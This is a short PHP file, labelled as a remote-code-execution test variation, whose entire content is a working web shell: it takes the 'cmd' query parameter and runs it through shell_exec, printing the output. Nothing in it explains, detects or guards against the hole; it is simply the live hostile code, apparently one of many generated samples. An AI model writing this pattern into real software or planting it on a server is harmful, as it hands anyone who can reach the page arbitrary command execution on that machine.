<?php
// RCE test variation #1330
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>